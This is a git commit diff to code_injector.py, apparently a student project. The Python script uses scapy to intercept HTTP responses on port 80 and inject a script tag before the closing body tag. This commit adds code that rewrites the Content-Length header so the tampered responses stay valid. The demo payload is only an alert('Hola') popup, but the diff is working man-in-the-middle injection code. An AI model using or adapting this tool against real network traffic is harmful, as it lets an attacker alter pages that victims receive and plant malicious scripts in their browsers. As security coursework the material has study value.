4a06bd70fde5bfb6127b9c31f2ca399d0af36056
vatojavier <antonioj.casado@estudiante.uam.es>
2019-07-25 22:53:11 +0200

    cambiando content leng, problemas cuando no ascii chars en headers

--- code_injector.py
+++ code_injector.py
@@ -6,6 +6,17 @@ import subprocess
 import re
 
 
+def get_content_len(response_header):
+    regex = "(?<=Content-Length: )[^.\\r\\n]*"
+    original_len = re.search(regex, response_header)
+    return int(original_len.group(0))
+
+
+def recalculate_content_len(original, injection, key_word):
+    new = original + len(injection) - len(key_word)
+    return new
+
+
 def set_load(s_packet, load):
     """Modifies the load of the scapy packet passed to the load"""
 
@@ -32,18 +43,39 @@ def process_packet(packet):
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response packet")
+            injection = "<script>alert('Hola');</script></body>"
+            key_word = "</body>"
+
             try:
                 load = scapy_packet[scapy.Raw].load.decode("utf-8")  # Errors when non ascii chars in the packets!
             except UnicodeDecodeError:
+                print("No asciiii")
+                print(str(scapy_packet[scapy.Raw].load))
                 packet.accept()
                 return
 
+            if "Content-Length:" in load:
+
+                print("Headers: \n" + load)
+                length = get_content_len(load)
+                print("Original len:" + str(length))
+                new_length = recalculate_content_len(length, injection, key_word)
+                print("New len: " + str(new_length))
+
+                new_load = re.sub("(?<=Content-Length: )[^.\\r\\n]*", str(new_length), load)  # Not accept encoding so receive http data in plain text
+                mod_packet = set_load(scapy_packet, new_load)
+                print("[+] MODIFIED Response packet: ")
+                print(mod_packet.show())
+
+                packet.set_payload(bytes(mod_packet))
+                load = scapy_packet[scapy.Raw].load.decode("utf-8")
+
             if "</body>" in load:
-                new_load = load.replace("</body>", "<script>alert('Hola');</script></body>")
+                new_load = load.replace("</body>", injection)
 
                 mod_packet = set_load(scapy_packet, new_load)
 
-                print("[+] MODIFIED Response packet: ")
+                print("[+] FINAL MODIFIED Response packet: ")
                 print(mod_packet.show())
                 packet.set_payload(bytes(mod_packet))
 
